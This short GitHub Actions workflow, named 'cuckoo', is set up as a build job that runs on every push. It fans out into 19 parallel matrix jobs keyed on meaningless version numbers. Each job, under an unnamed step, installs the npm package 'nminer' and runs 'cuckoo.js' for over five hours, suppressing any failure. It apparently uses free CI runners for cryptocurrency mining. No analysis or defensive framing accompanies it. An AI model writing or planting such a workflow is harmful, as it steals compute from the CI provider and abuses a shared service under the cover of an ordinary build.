name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7421 }
          - { version: 7284 }
          - { version: 8794 }
          - { version: 3221 }
          - { version: 4096 }
          - { version: 942 }
          - { version: 6242 }
          - { version: 4066 }
          - { version: 5102 }
          - { version: 2050 }
          - { version: 6353 }
          - { version: 357 }
          - { version: 7006 }
          - { version: 7182 }
          - { version: 547 }
          - { version: 8598 }
          - { version: 4262 }
          - { version: 5299 }
          - { version: 8993 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 316m node cuckoo.js || echo "cuckoo executed"